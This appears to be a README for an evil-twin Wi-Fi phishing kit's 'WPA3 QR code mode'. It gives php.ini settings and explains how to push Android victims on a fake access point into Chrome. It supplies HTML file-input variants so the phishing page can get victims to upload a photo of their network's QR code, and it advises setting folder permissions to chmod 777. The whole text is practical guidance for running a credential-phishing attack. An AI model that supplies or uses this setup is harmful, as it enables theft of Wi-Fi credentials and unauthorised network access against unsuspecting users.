To use wpa3 QR code mode you need to configure your php.ini as following :

post_max_size = 8M
file_uploads = On
upload_max_filesize = 16M
max_file_uploads = 20
allow_url_fopen = On

---> Phishing pages are made in html5 with php8.3.3 and javascript.

QR code is good for mobile phone but there are many configuration.
Android browser app doesn't fully support html attributes and php code.
So when android connect to the fake AP we need to use another browser than the default android browser app.
We invite the user to use chrome and the if ok it will be redirected to chome browser.
From chrome we can use php code and upload files with the phishing pages.
The upload is made in ajax.


If you have a problem using this phising page asking a picture of the QR code so try to change the html input on *mobile.php

Android is dumbshit...some android browser app work with this code : (directly taking a picture).
TRY 1 : <input id="uploadImage" type="file" capture="user" accept="image/*" name="image" />

And other need this code because they don't recognize the capture html attribute... :
try 2:  <input id="uploadImage" type="file" accept="image/*" name="image" />

Also :

<input id="uploadImage" type="file" name="image" />  -->{THIS IS THE DEFAULT CODE USED IN *MOBILE.PHP}<--

work. 

To make a local test you need to chmod 777 * into the folder where the ajax and js code are.
Then restart your apache or http server.
NOTE : you can't use this code directly into your main folder of apache or httpd due to security rules.
